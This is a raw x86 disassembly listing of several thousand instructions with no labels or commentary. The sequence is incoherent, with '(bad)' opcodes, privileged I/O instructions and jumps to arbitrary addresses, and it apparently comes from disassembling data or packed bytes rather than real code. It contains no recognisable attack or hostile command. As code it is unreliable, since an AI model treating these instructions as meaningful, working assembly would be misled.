  443d2b:	sbb    ch,BYTE PTR [esi+0x6ed592d6]
  443d31:	xchg   esp,eax
  443d32:	daa    
  443d33:	ja     0x443cd7
  443d35:	outs   dx,DWORD PTR ds:[esi]
  443d36:	and    BYTE PTR [edi+0x5151f389],0x9b
  443d3d:	ret    0xedf5
  443d40:	daa    
  443d41:	add    edi,esi
  443d43:	xorps  xmm1,XMMWORD PTR [ecx]
  443d46:	int3   
  443d47:	pop    edi
  443d48:	fsub   QWORD PTR [eax+0x65]
  443d4b:	sub    DWORD PTR [edx-0x614b10db],ecx
  443d51:	mov    WORD PTR [eax],gs
  443d53:	addr16 xchg edx,eax
  443d55:	lea    ecx,[edi]
  443d57:	fwait
  443d58:	sub    DWORD PTR ds:0x3447d591,edi
  443d5e:	inc    edi
  443d5f:	pop    ss
  443d60:	lods   eax,DWORD PTR ds:[esi]
  443d61:	loopne 0x443dc3
  443d63:	aad    0xef
  443d65:	adc    ebp,DWORD PTR [eax]
  443d67:	lods   eax,DWORD PTR ds:[esi]
  443d68:	push   0x96d436c1
  443d6d:	into   
  443d6e:	mov    esi,0x94ea4f1
  443d73:	mov    bl,0x8e
  443d75:	mov    cl,0x51
  443d77:	fisub  WORD PTR [ebp+0x32970e7b]
  443d7d:	push   0x43f4d2bf
  443d82:	add    eax,0xb96f7a61
  443d87:	push   esp
  443d88:	fst    DWORD PTR [eax+0x1b880744]
  443d8e:	sbb    DWORD PTR [edi+0x75],ebp
  443d91:	or     esi,0x5e488762
  443d97:	xor    eax,0x85b38241
  443d9c:	mov    fs:0x6b893b04,al
  443da2:	sti    
  443da3:	inc    ebp
  443da4:	ja     0x443d68
  443da6:	add    DWORD PTR [esp+ebx*8-0x519d79fe],ecx
  443dad:	pop    eax
  443dae:	xor    al,0xd1
  443db0:	or     BYTE PTR [ecx+0x59],dl
  443db3:	pop    ecx
  443db4:	sti    
  443db5:	sbb    BYTE PTR [esi-0x48a06032],bl
  443dbb:	addr16 mov esi,0x72bb3605
  443dc1:	inc    esi
  443dc2:	xchg   esp,eax
  443dc3:	cmp    eax,edx
  443dc5:	leave  
  443dc6:	pusha  
  443dc7:	jno    0x443d7c
  443dc9:	push   edx
  443dca:	push   0xcd9830a8
  443dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443dd0:	std    
  443dd1:	jle    0x443e4d
  443dd3:	out    dx,al
  443dd4:	mov    BYTE PTR [esi-0x72],bl
  443dd7:	mov    dh,0x67
  443dd9:	xlat   BYTE PTR ds:[ebx]
  443dda:	rol    cl,0xac
  443ddd:	neg    BYTE PTR [ebp+0x7d]
  443de0:	dec    edx
  443de1:	jmp    0xa8a42805
  443de6:	sub    DWORD PTR [edx+0x54],0x2
  443dea:	mov    al,0xa6
  443dec:	lods   al,BYTE PTR ds:[esi]
  443ded:	add    DWORD PTR [edx+ecx*2],edi
  443df0:	mov    eax,ds:0xeb671e48
  443df5:	in     eax,dx
  443df6:	xor    eax,0xd686e8db
  443dfb:	aam    0x6a
  443dfd:	mov    al,0x10
  443dff:	aad    0xcf
  443e01:	retf   0x18af
  443e04:	jmp    DWORD PTR [ebx]
  443e06:	paddq  mm1,QWORD PTR [ecx-0x49]
  443e0a:	ror    DWORD PTR [edi],1
  443e0c:	bound  eax,QWORD PTR [edi]
  443e0e:	test   ebp,edx
  443e10:	out    0x42,al
  443e12:	sbb    bh,BYTE PTR [edi+0x7e46e7b6]
  443e18:	mov    DWORD PTR [edi-0x5d],eax
  443e1b:	popa   
  443e1c:	sbb    dl,BYTE PTR [edx-0x11dcd4f0]
  443e22:	sub    cl,dh
  443e24:	retf   
  443e25:	add    cl,BYTE PTR [esp+ebx*4]
  443e28:	push   edi
  443e29:	stos   DWORD PTR es:[edi],eax
  443e2a:	pop    esp
  443e2b:	ins    BYTE PTR es:[edi],dx
  443e2c:	sbb    ch,bh
  443e2e:	pop    ds
  443e2f:	mov    ebp,0x6e7cfdd9
  443e34:	test   al,0xf6
  443e36:	imul   ecx,ebp,0x76
  443e39:	neg    DWORD PTR [eax-0x62]
  443e3c:	lock push esi
  443e3e:	aam    0xa3
  443e40:	sub    BYTE PTR [ecx-0x62371284],dh
  443e46:	jne    0x443dde
  443e48:	ja     0x443e30
  443e4a:	add    al,0x5f
  443e4c:	and    DWORD PTR [ebp-0x34],0x600742ef
  443e53:	cli    
  443e54:	cwde   
  443e55:	xor    eax,0x7e8e89d6
  443e5a:	addr16 aam 0x77
  443e5d:	inc    ecx
  443e5e:	mov    bh,0xa8
  443e60:	pop    eax
  443e61:	je     0x443e82
  443e63:	mov    bh,0xd6
  443e65:	test   eax,0xec69d87e
  443e6a:	jns    0x443ed4
  443e6c:	sbb    ebp,DWORD PTR [edi+0x78]
  443e6f:	inc    ebp
  443e70:	mov    BYTE PTR [ebp-0x6a],ah
  443e73:	in     eax,dx
  443e74:	fistp  DWORD PTR [ecx]
  443e76:	and    eax,eax
  443e78:	mov    DWORD PTR [ebp+0x77f5f4c3],eax
  443e7e:	mov    edi,0xa2030dce
  443e83:	adc    cl,BYTE PTR [edx+0x43f1e927]
  443e89:	or     al,0x60
  443e8b:	sub    edi,edx
  443e8d:	aad    0x54
  443e8f:	fwait
  443e90:	mov    al,0xf5
  443e92:	loop   0x443e69
  443e94:	cdq    
  443e95:	jb     0x443e32
  443e97:	ffree  st(3)
  443e99:	lods   eax,DWORD PTR ds:[esi]
  443e9a:	push   esp
  443e9b:	fcom   DWORD PTR [ebp-0x53]
  443e9e:	pop    ds
  443e9f:	retf   
  443ea0:	sub    ah,BYTE PTR [edx-0xb33a46]
  443ea6:	pop    esp
  443ea7:	pushf  
  443ea8:	loope  0x443e7b
  443eaa:	into   
  443eab:	push   esp
  443eac:	(bad)  
  443ead:	mov    dl,0x9a
  443eaf:	jg     0x443e53
  443eb1:	pop    ss
  443eb2:	push   ds
  443eb3:	(bad)  
  443eb4:	or     edx,DWORD PTR [ebx+0x7e6e92b0]
  443eba:	cdq    
  443ebb:	aam    0x2f
  443ebd:	sub    eax,0x48dbd863
  443ec2:	ret    0xb3c0
  443ec5:	cmc    
  443ec6:	or     eax,0x5bc30975
  443ecb:	sub    DWORD PTR [eax],0x28
  443ece:	sahf   
  443ecf:	aad    0xb
  443ed1:	add    eax,0x9cdc4915
  443ed6:	cld    
  443ed7:	arpl   cx,di
  443ed9:	popa   
  443eda:	das    
  443edb:	aam    0x30
  443edd:	mov    eax,0x69e9c149
  443ee2:	cld    
  443ee3:	pop    esi
  443ee4:	jl     0x443f20
  443ee6:	pop    ds
  443ee7:	es push ebp
  443ee9:	retf   
  443eea:	pop    esi
  443eeb:	jmp    0x8b9:0x5560618d
  443ef2:	pushf  
  443ef3:	jb     0x443e91
  443ef5:	jmp    0xab1c:0x1c6c98d0
  443efc:	(bad)  
  443efd:	ins    BYTE PTR es:[edi],dx
  443efe:	cwde   
  443eff:	xchg   ebp,eax
  443f00:	sub    DWORD PTR [ecx-0x28776933],esi
  443f06:	in     al,dx
  443f07:	loop   0x443ef8
  443f09:	or     DWORD PTR [ebp+0x5e0ee83e],esp
  443f0f:	aam    0xe7
  443f11:	mov    cl,0x3b
  443f13:	jmp    0xe8fdadd8
  443f18:	mov    bl,bh
  443f1a:	repnz rol DWORD PTR [edi-0x5ce3b3dc],cl
  443f21:	inc    edi
  443f22:	lock mov esp,0x96102fc
  443f28:	push   ds
  443f29:	ds add al,0xb6
  443f2c:	mov    ecx,esp
  443f2e:	dec    eax
  443f2f:	sahf   
  443f30:	loopne 0x443ee0
  443f32:	ret    
  443f33:	pop    ds
  443f34:	call   0xfeb8413e
  443f39:	xor    ebx,DWORD PTR [eax+0x1f38a9f4]
  443f3f:	mov    bl,0x6d
  443f41:	jae    0x443efe
  443f43:	dec    edx
  443f44:	test   dl,bh
  443f46:	int3   
  443f47:	aam    0xc1
  443f49:	cmp    eax,0xe37245f7
  443f4e:	loop   0x443f6a
  443f50:	mov    DWORD PTR [ebp-0x4c],edx
  443f53:	out    dx,eax
  443f54:	sbb    eax,DWORD PTR [ebx-0x2c]
  443f57:	aaa    
  443f58:	fld    QWORD PTR [edx]
  443f5a:	loopne 0x443f77
  443f5c:	int3   
  443f5d:	repz mov WORD PTR [edi-0x42828fee],gs
  443f64:	adc    esi,ebp
  443f66:	je     0x443f3c
  443f68:	test   al,0x5e
  443f6a:	sti    
  443f6b:	jnp    0x443f38
  443f6d:	dec    ebp
  443f6e:	pop    eax
  443f6f:	shl    BYTE PTR [edi-0x435c21e5],0x24
  443f76:	push   ds
  443f77:	mov    esp,0x4ab049
  443f7c:	xor    edx,edx
  443f7e:	popa   
  443f7f:	dec    ebx
  443f80:	fsubp  st(0),st
  443f82:	sub    eax,0xa1878c
  443f87:	mov    ecx,0xf156059f
  443f8c:	sbb    eax,DWORD PTR [eax+0x42]
  443f8f:	and    ebx,DWORD PTR [ecx-0x25b0e1b4]
  443f95:	int    0x11
  443f97:	inc    eax
  443f98:	sub    BYTE PTR [ebx-0x27],ch
  443f9b:	aad    0x8d
  443f9d:	xlat   BYTE PTR ds:[ebx]
  443f9e:	push   es
  443f9f:	pop    esi
  443fa0:	sbb    BYTE PTR [ebp-0x4e7448a6],0xc9
  443fa7:	test   eax,0x46733330
  443fac:	inc    eax
  443fad:	aad    0xd3
  443faf:	rcl    BYTE PTR [esi],0x2
  443fb2:	call   0x89ae:0xc5ddc44e
  443fb9:	mov    esi,0x8f4d7d60
  443fbe:	test   al,0xc2
  443fc0:	in     al,0x88
  443fc2:	dec    ecx
  443fc3:	aam    0x6d
  443fc5:	stos   DWORD PTR es:[edi],eax
  443fc6:	cmp    eax,0xb9571c05
  443fcb:	add    esi,esp
  443fcd:	jmp    0x205213e4
  443fd2:	arpl   WORD PTR [eax-0x3c],cx
  443fd5:	sbb    edx,DWORD PTR [edi+edx*8]
  443fd8:	dec    ecx
  443fd9:	fucom  st(0)
  443fdb:	arpl   WORD PTR [edi],di
  443fdd:	test   BYTE PTR [ebx-0x45],0x8a
  443fe1:	xchg   edi,eax
  443fe2:	int    0x4d
  443fe4:	sti    
  443fe5:	push   edi
  443fe6:	xchg   bh,ch
  443fe8:	ss add esi,ecx
  443feb:	(bad)  [esi+0x1d]
  443fee:	aam    0x2f
  443ff0:	fcmovb st,st(7)
  443ff2:	add    al,0x8c
  443ff4:	test   eax,0x8881ae80
  443ff9:	cmp    DWORD PTR [ebx+eiz*4-0x60a3a3c8],edi
  444000:	add    DWORD PTR [ebx],eax
  444002:	out    0x33,al
  444004:	jmp    0xaa93ccbc
  444009:	aam    0xbc
  44400b:	pop    ecx
  44400c:	dec    ebp
  44400d:	jnp    0x44402d
  44400f:	mov    ebp,DWORD PTR [bx]
  444012:	xchg   edx,eax
  444013:	xor    ebx,ecx
  444015:	add    eax,0xb56ed95e
  44401a:	shl    BYTE PTR [ebp-0x2ce079ce],1
  444020:	mov    edi,0x641413b9
  444025:	in     eax,dx
  444026:	adc    ecx,edx
  444028:	xor    BYTE PTR [edi+0x60],ah
  44402b:	adc    BYTE PTR es:[esi-0x41],cl
  44402f:	cmp    eax,0x711f1ab5
  444034:	and    DWORD PTR [ecx-0x2d],edi
  444037:	add    eax,0xd62e6a34
  44403c:	jb     0x444013
  44403e:	out    0x7f,al
  444040:	mov    dl,0xef
  444042:	xor    ebp,esi
  444044:	mov    BYTE PTR [esi],al
  444046:	sub    esp,DWORD PTR [ebx+0x37efb9b4]
  44404c:	xchg   DWORD PTR [edx-0x71],ebp
  44404f:	clc    
  444050:	mov    dl,ch
  444052:	xchg   esi,eax
  444053:	push   0x34d81820
  444058:	adc    al,0xd6
  44405a:	jnp    0x4440b0
  44405c:	fwait
  44405d:	push   ebp
  44405e:	or     eax,DWORD PTR [edx+0x20624989]
  444064:	js     0x444078
  444066:	mov    edx,0xf6d192cd
  44406b:	aam    0x76
  44406d:	sub    esp,DWORD PTR [esp+edx*1-0x72]
  444071:	jne    0x44406a
  444073:	lea    ecx,[esi-0x376cabd]
  444079:	inc    esi
  44407a:	jp     0x444081
  44407c:	stos   BYTE PTR es:[edi],al
  44407d:	in     al,0xae
  44407f:	aad    0x19
  444081:	or     dh,cl
  444083:	pop    ds
  444084:	pop    eax
  444085:	scas   eax,DWORD PTR es:[edi]
  444086:	jmp    0x9831c8bb
  44408b:	aaa    
  44408c:	loopne 0x44409f
  44408e:	stos   DWORD PTR es:[edi],eax
  44408f:	cmp    al,0x9e
  444091:	pop    edx
  444092:	or     dh,BYTE PTR [ecx+0x67]
  444095:	add    cl,al
  444097:	xchg   esp,eax
  444098:	call   0x6097:0x5d95cd32
  44409f:	(bad)  
  4440a0:	pushf  
  4440a1:	cmp    DWORD PTR [ebp-0x58],esp
  4440a4:	(bad)  
  4440a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4440a6:	rcl    ebp,cl
  4440a8:	push   eax
  4440a9:	loop   0x4440a3
  4440ab:	mov    dh,0x7d
  4440ad:	xor    DWORD PTR [edi],ebx
  4440af:	xchg   WORD PTR [edi+0x32],bx
  4440b3:	xchg   esp,eax
  4440b4:	cmc    
  4440b5:	mov    bh,0x20
  4440b7:	sbb    esi,DWORD PTR [eax+eiz*8-0x37b663e9]
  4440be:	inc    edi
  4440bf:	(bad)  
  4440c0:	cli    
  4440c1:	test   BYTE PTR [edx+0x36432422],ch
  4440c7:	icebp  
  4440c8:	outs   dx,BYTE PTR ds:[esi]
  4440c9:	shl    BYTE PTR [edx+0x55],1
  4440cc:	push   ebx
  4440cd:	iret   
  4440ce:	ins    BYTE PTR es:[edi],dx
  4440cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4440d0:	inc    ebx
  4440d1:	pop    edx
  4440d2:	push   es
  4440d3:	sub    DWORD PTR [edx+eax*1-0x34fb220a],edi
  4440da:	xor    BYTE PTR [edx],ah
  4440dc:	in     al,dx
  4440dd:	mov    ch,0x6e
  4440df:	mov    bh,0xad
  4440e1:	dec    esp
  4440e2:	sub    DWORD PTR [ebx-0x18],ebp
  4440e5:	xor    DWORD PTR [edi],0x8
  4440e8:	daa    
  4440e9:	add    esp,DWORD PTR [edx]
  4440eb:	inc    edx
  4440ec:	ss iret 
  4440ee:	jmp    DWORD PTR ds:0xd49df8ff
  4440f4:	add    dh,BYTE PTR [edi+edx*2-0x321e6a64]
  4440fb:	into   
  4440fc:	rol    BYTE PTR [edx],1
  4440fe:	retf   0x7141
  444101:	cmp    al,0x31
  444103:	mov    esi,0xb71fb34d
  444108:	xchg   edx,eax
  444109:	and    eax,0xec761bdc
  44410e:	pop    ebp
  44410f:	aad    0xe2
  444111:	sub    dh,BYTE PTR [edx]
  444113:	es out dx,al
  444115:	scas   al,BYTE PTR es:[edi]
  444116:	or     al,0x18
  444118:	mov    ecx,DWORD PTR [edi+0x5fb5be9c]
  44411e:	inc    ebp
  44411f:	lods   eax,DWORD PTR ds:[esi]
  444120:	sub    BYTE PTR [ebp-0x501f2b90],ah
  444126:	and    BYTE PTR [esi],bh
  444128:	std    
  444129:	mov    esp,0x988673e
  44412e:	into   
  44412f:	push   ebx
  444130:	add    ah,0x58
  444133:	mov    eax,0xe08e0586
  444138:	std    
  444139:	ret    
  44413a:	jle    0x444157
  44413c:	stc    
  44413d:	fstp   DWORD PTR [edi]
  44413f:	or     eax,0x99d6f835
  444144:	xor    BYTE PTR [ebx+0x56e5d569],cl
  44414a:	dec    eax
  44414b:	fdiv   st,st(1)
  44414d:	dec    esi
  44414e:	sub    al,0x19
  444150:	mov    BYTE PTR [ebp-0x61],dh
  444153:	je     0x444143
  444155:	sub    DWORD PTR [ebx-0x7677ea07],edi
  44415b:	enter  0x5295,0x7d
  44415f:	cli    
  444160:	dec    ecx
  444161:	aad    0x7b
  444163:	fwait
  444164:	out    0x7e,al
  444166:	pop    ds
  444167:	jg     0x444183
  444169:	cmp    eax,0xf22caad
  44416e:	mov    ds:0xd8d311d5,eax
  444173:	cwde   
  444174:	push   eax
  444175:	frstor [ecx]
  444177:	iret   
  444178:	je     0x44413b
  44417a:	popa   
  44417b:	rcl    edi,0x65
  44417e:	push   es
  44417f:	cli    
  444180:	cdq    
  444181:	sub    DWORD PTR [edi+edx*4],edx
  444184:	sub    dl,BYTE PTR [esi-0x77]
  444187:	aad    0xac
  444189:	mov    ebx,0x6a89f2ae
  44418e:	cdq    
  44418f:	loope  0x4441e1
  444191:	adc    ebx,DWORD PTR [edi]
  444193:	sbb    eax,edx
  444195:	mov    eax,ds:0x667321b1
  44419a:	(bad)  
  44419b:	ficomp WORD PTR [ebp-0x511c09fb]
  4441a1:	cmp    DWORD PTR ds:0x1e1b565d,ecx
  4441a7:	xchg   ebx,eax
  4441a8:	sar    DWORD PTR [ebx-0x5cb9f14a],0x93
  4441af:	xlat   BYTE PTR ds:[ebx]
  4441b0:	fnstcw WORD PTR [eax]
  4441b2:	sub    al,0x90
  4441b4:	stos   BYTE PTR es:[edi],al
  4441b5:	lahf   
  4441b6:	imul   esi,ebp,0x231e245c
  4441bc:	jmp    0x444202
  4441be:	ins    BYTE PTR es:[edi],dx
  4441bf:	xchg   ebx,eax
  4441c0:	nop
  4441c1:	jb     0x444231
  4441c3:	les    eax,FWORD PTR ds:0x887f9f92
  4441c9:	xor    ecx,DWORD PTR [ecx-0x46a7dc41]
  4441cf:	xor    cl,BYTE PTR [edi+0x4404460b]
  4441d5:	popa   
  4441d6:	retf   
  4441d7:	and    eax,0xaaf298a2
  4441dc:	mov    esi,0xd8ed9c79
  4441e1:	and    ah,BYTE PTR [ecx]
  4441e3:	adc    BYTE PTR [eax+ebx*1+0x1f30c561],al
  4441ea:	mov    es,WORD PTR [ebp+0x53]
  4441ed:	dec    edi
  4441ee:	mov    esi,0xe6e71a33
  4441f3:	aam    0x34
  4441f5:	cdq    
  4441f6:	xor    DWORD PTR [edi-0x71f1e2bb],esp
  4441fc:	mov    DWORD PTR [edi],eax
  4441fe:	and    DWORD PTR [eax],esp
  444200:	addr16 sub al,0x35
  444203:	sub    eax,0x56f0013c
  444208:	jmp    0x444205
  44420a:	ins    DWORD PTR es:[edi],dx
  44420b:	adc    DWORD PTR [edi-0x9e88723],0xffffffdf
  444212:	and    ebp,DWORD PTR [ebp-0x74d53d55]
  444218:	xor    BYTE PTR ds:0x1d7dffe7,0xb4
  44421f:	ror    BYTE PTR [edi],0x59
  444222:	sub    eax,0x6d1d19f3
  444227:	sub    cl,BYTE PTR [eax-0x616eabdd]
  44422d:	and    cl,BYTE PTR [eax]
  44422f:	popaw  
  444231:	add    esi,DWORD PTR [ecx+eiz*2]
  444234:	repnz and eax,0xbf09be4d
  44423a:	pusha  
  44423b:	popa   
  44423c:	add    edx,edx
  44423e:	stc    
  44423f:	and    al,0x1e
  444241:	mov    ds:0x5db1d55a,eax
  444246:	cmp    ch,dl
  444248:	mov    ds:0x88f7c163,al
  44424d:	pmulhuw mm4,QWORD PTR [ecx+0x60]
  444251:	xchg   bh,bl
  444253:	mov    edx,0xc81a058b
  444258:	daa    
  444259:	in     eax,0xda
  44425b:	sub    al,dl
  44425d:	push   eax
  44425e:	push   ds
  44425f:	xchg   edi,eax
  444260:	mov    al,ds:0x541d7983
  444265:	mov    al,0x5e
  444267:	aam    0x20
  444269:	cmp    al,0x13
  44426b:	fsubr  DWORD PTR [ebp-0x18]
  44426e:	retf   0x8891
  444271:	das    
  444272:	and    BYTE PTR [ebp-0x49],0xc5
  444276:	jp     0x444253
  444278:	repz xchg edx,eax
  44427a:	jmp    0xd891d26d
  44427f:	mov    ds:0x8b3fd1c6,al
  444284:	hlt    
  444285:	fild   QWORD PTR [eax+0x1fcc2bb9]
  44428b:	mov    edi,0xda68790a
  444290:	sbb    eax,0xac5bde57
  444295:	add    eax,0x2fb99d32
  44429a:	mov    esi,gs
  44429c:	mov    DWORD PTR [edi-0x62be09fc],eax
  4442a2:	in     al,dx
  4442a3:	push   eax
  4442a4:	mov    BYTE PTR ds:0xf8b07710,0xa6
  4442ab:	xor    BYTE PTR [eax+0x24],dh
  4442ae:	(bad)  
  4442af:	sbb    BYTE PTR [ecx-0x44a38def],cl
  4442b5:	xchg   ebp,eax
  4442b6:	div    eax
  4442b8:	test   DWORD PTR [edi+eiz*2],ecx
  4442bb:	inc    ebx
  4442bc:	mov    ebp,0x128c1f8f
  4442c1:	int    0x1a
  4442c3:	mov    dl,0x63
  4442c5:	and    DWORD PTR [edi+0x88ff5cb],edx
  4442cb:	aam    0xd1
  4442cd:	or     eax,0x19788326
  4442d2:	fcmovu st,st(4)
  4442d4:	push   edi
  4442d5:	add    esi,DWORD PTR [edx+0x21]
  4442d8:	mov    ebp,0x5e682bb7
  4442dd:	cmc    
  4442de:	pop    ds
  4442df:	xlat   BYTE PTR ds:[ebx]
  4442e0:	stos   DWORD PTR es:[edi],eax
  4442e1:	ret    
  4442e2:	call   FWORD PTR [edx-0x18]
  4442e5:	mov    esi,0xce46d49f
  4442ea:	ins    DWORD PTR es:[edi],dx
  4442eb:	or     esp,DWORD PTR [esp+ebp*2-0xb]
  4442ef:	adc    DWORD PTR [eax+0x79a961e1],ecx
  4442f5:	call   0xe9d0:0x84890355
  4442fc:	lock das 
  4442fe:	mov    ah,0x15
  444300:	or     eax,0x6b0bbd3a
  444305:	add    ebx,eax
  444307:	shl    BYTE PTR [ebp-0x6f],cl
  44430a:	sbb    dl,dh
  44430c:	cld    
  44430d:	and    BYTE PTR [esi],bl
  44430f:	sub    DWORD PTR [ecx+0x10],esi
  444312:	jg     0x444326
  444314:	adc    BYTE PTR [ebp+0x7658d700],bl
  44431a:	pop    ebp
  44431b:	jmp    0xdc3b1267
  444320:	mov    BYTE PTR [ebx+0x47],cl
  444323:	inc    ebx
  444324:	mov    fs,WORD PTR [esi+0x4d]
  444327:	jno    0x4442aa
  444329:	add    eax,0xa5fc0602
  44432e:	sbb    DWORD PTR [esi-0x489f48d4],edx
  444334:	pop    esi
  444335:	sub    al,0x8e
  444337:	mov    eax,ds:0xd59ae8de
  44433c:	mov    DWORD PTR [esi+0x7708904e],edx
  444342:	xor    esi,DWORD PTR [edx+ebp*2-0x2f]
  444346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444347:	lds    ebp,FWORD PTR [eax-0x3d7ca53a]
  44434d:	enter  0x98c6,0x58
  444351:	inc    ecx
  444352:	ins    BYTE PTR es:[edi],dx
  444353:	fst    st(7)
  444355:	jmp    0x15a8be93
  44435a:	int3   
  44435b:	push   edi
  44435c:	xlat   BYTE PTR ds:[ebx]
  44435d:	add    bl,0x3a
  444360:	xchg   esp,eax
  444361:	mov    fs,WORD PTR [ebp-0x5]
  444364:	mov    cl,0xd4
  444366:	jb     0x4442ff
  444368:	pop    eax
  444369:	add    ah,BYTE PTR [edx-0x2c5685b6]
  44436f:	iret   
  444370:	lahf   
  444371:	inc    edi
  444372:	sub    ch,BYTE PTR [edi]
  444374:	inc    ebp
  444375:	pop    ecx
  444376:	push   ds
  444377:	fild   QWORD PTR [ebp+0x2]
  44437a:	ins    DWORD PTR es:[edi],dx
  44437b:	cmp    ch,BYTE PTR [eax+eiz*1+0x64cfd4e4]
  444382:	bnd jbe 0x4443a0
  444385:	mov    cl,0x52
  444387:	pop    edx
  444388:	mov    DWORD PTR [ecx+0xa],ecx
  44438b:	stos   DWORD PTR es:[edi],eax
  44438c:	cmc    
  44438d:	inc    ebx
  44438e:	fbld   TBYTE PTR [eax]
  444390:	out    0x5,al
  444392:	mov    es,esi
  444394:	ror    ebp,0x4d
  444397:	sub    esi,DWORD PTR [ecx+0x3c]
  44439a:	fs push ebx
  44439c:	mov    bh,0x27
  44439e:	dec    edx
  44439f:	mov    ch,0x5f
  4443a1:	add    dh,0x30
  4443a4:	add    ebx,DWORD PTR ds:[edx]
  4443a7:	push   ebp
  4443a8:	adc    eax,0xb7fda7b4
  4443ad:	mov    dl,0x60
  4443af:	adc    ecx,DWORD PTR [edx]
  4443b1:	out    0x75,al
  4443b3:	mov    WORD PTR [eax],ss
  4443b5:	xor    eax,DWORD PTR [ecx-0x7a9e6d2e]
  4443bb:	aas    
  4443bc:	cmp    ebp,DWORD PTR [eax+0x5e]
  4443bf:	cli    
  4443c0:	inc    esi
  4443c1:	pop    edi
  4443c2:	push   ds
  4443c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4443c4:	sti    
  4443c5:	in     al,dx
  4443c6:	shl    cl,1
  4443c8:	inc    esp
  4443c9:	jne    0x444449
  4443cb:	aam    0x2b
  4443cd:	push   edx
  4443ce:	jne    0x44440c
  4443d0:	(bad)  
  4443d1:	(bad)  
  4443d3:	adc    BYTE PTR [ecx+0x2e38d62d],cl
  4443d9:	fisttp WORD PTR [edi-0x6bfca44d]
  4443df:	test   DWORD PTR [ebx+0x50],0xfdcc5c75
  4443e6:	add    BYTE PTR [esi-0x78],al
  4443e9:	mov    ch,0x5c
  4443eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4443ec:	out    0xe1,eax
  4443ee:	jmp    0x4443c3
  4443f0:	imul   eax,DWORD PTR [eax],0x64e9dc4e
  4443f6:	fmul   DWORD PTR [esi]
  4443f8:	rcr    al,cl
  4443fa:	hlt    
  4443fb:	cmp    edi,eax
  4443fd:	and    BYTE PTR [eax-0xe0c0f14],ch
  444403:	aad    0x60
  444405:	adc    ch,ah
  444407:	fmul   QWORD PTR [edx-0x45]
  44440a:	and    eax,0x4599ead7
  44440f:	daa    
  444410:	dec    esi
  444411:	loop   0x4443d6
  444413:	pushf  
  444414:	mov    edi,esi
  444416:	push   ss
  444417:	dec    eax
  444418:	test   eax,0x6463d3
  44441d:	add    bh,dl
  44441f:	and    al,0x85
  444421:	push   esi
  444422:	jae    0x444419
  444424:	push   esi
  444425:	add    ebx,DWORD PTR [edi]
  444427:	test   DWORD PTR [eax-0x5d],ebx
  44442a:	cmp    ebp,DWORD PTR [esi]
  44442c:	cmp    BYTE PTR [ecx-0x4c],al
  44442f:	mov    eax,0x87de9425
  444434:	or     BYTE PTR [eax],bl
  444436:	push   cs
  444437:	mov    ?,edx
  444439:	pop    esi
  44443a:	push   0x844ac25d
  44443f:	in     eax,dx
  444440:	mov    BYTE PTR [esi+0x2ff2993],cl
  444446:	mov    esp,0xd76cfba5
  44444b:	push   ds
  44444c:	in     eax,0xe9
  44444e:	fwait
  44444f:	aaa    
  444450:	js     0x444454
  444452:	and    al,0x6e
  444454:	push   cs
  444455:	and    dl,BYTE PTR [eax]
  444457:	mov    ds:0x726c05aa,eax
  44445c:	ror    bl,0x9c
  44445f:	rcr    BYTE PTR [edx+0x8],0x60
  444463:	sub    DWORD PTR [edi+0x369c0ebd],ebp
  444469:	scas   al,BYTE PTR es:[edi]
  44446a:	adc    ebp,0x3acf8936
  444470:	(bad)  
  444472:	jp     0x4444d2
  444474:	mov    WORD PTR [edi],?
  444476:	and    al,0xd3
  444478:	(bad)  
  444479:	daa    
  44447a:	push   ecx
  44447b:	push   esp
  44447c:	cmp    al,0x8d
  44447e:	rcl    ebp,1
  444480:	scas   eax,DWORD PTR es:[edi]
  444481:	stos   DWORD PTR es:[edi],eax
  444482:	rcr    DWORD PTR [edx+0x6a],1
  444485:	cld    
  444486:	jl     0x44442e
  444488:	mov    DWORD PTR [ebp-0x2e],ebp
  44448b:	mov    dh,BYTE PTR [eax-0x60]
  44448e:	in     al,dx
  44448f:	xchg   ebp,eax
  444490:	inc    DWORD PTR [edx]
  444492:	xor    BYTE PTR [ebp+0x173d5284],0xb4
  444499:	push   ds
  44449a:	push   ds
  44449b:	and    eax,0xf4ee0725
  4444a0:	ss mov edx,0x5f9d9b1
  4444a6:	fdiv   QWORD PTR [esi-0x2921a21d]
  4444ac:	push   0x3e
  4444ae:	push   ds
  4444af:	outs   dx,DWORD PTR ds:[esi]
  4444b0:	and    eax,0x2a2fbe85
  4444b5:	shr    BYTE PTR [esi-0x13],cl
  4444b8:	clc    
  4444b9:	add    dl,al
  4444bb:	sbb    ecx,0xb8f3c0ae
  4444c1:	dec    eax
  4444c2:	pop    ds
  4444c3:	push   ebp
  4444c4:	inc    ebp
  4444c5:	sub    DWORD PTR [edi-0x5],eax
  4444c8:	push   edx
  4444c9:	lds    eax,FWORD PTR [eax-0x2b]
  4444cc:	pop    ebp
  4444cd:	push   esi
  4444ce:	jne    0x444509
  4444d0:	dec    ebp
  4444d1:	jae    0x444524
  4444d3:	adc    eax,DWORD PTR [esi-0x74c5d30b]
  4444d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4444da:	and    BYTE PTR [esp+ebx*1],ah
  4444dd:	or     BYTE PTR [esi-0x48],0x5f
  4444e1:	xor    DWORD PTR [ebp+0x2ec6093b],eax
  4444e7:	push   esi
  4444e8:	dec    ecx
  4444e9:	sub    DWORD PTR [ebp-0x1b],ebp
  4444ec:	das    
  4444ed:	pop    ecx
  4444ee:	mov    ch,0xa2
  4444f0:	or     DWORD PTR [eax+0x10],esi
  4444f3:	jae    0x444524
  4444f5:	add    ch,dl
  4444f7:	inc    edx
  4444f8:	add    edi,DWORD PTR [edx-0x285ec034]
  4444fe:	pusha  
  4444ff:	scas   eax,DWORD PTR es:[edi]
  444500:	rol    bh,0x97
  444503:	cwde   
  444504:	mov    WORD PTR [edi],?
  444506:	mov    esi,0x747864d5
  44450b:	xchg   esp,eax
  44450c:	mov    esi,0x88ff5e0b
  444511:	lahf   
  444512:	push   cs
  444513:	arpl   sp,di
  444515:	(bad)  
  444516:	jle    0x444526
  444518:	aaa    
  444519:	add    cl,dl
  44451b:	cmp    DWORD PTR ss:[edi],ebp
  44451e:	ins    DWORD PTR es:[edi],dx
  44451f:	xchg   edx,eax
  444520:	neg    BYTE PTR [ebp+ebx*2+0x616c8c7b]
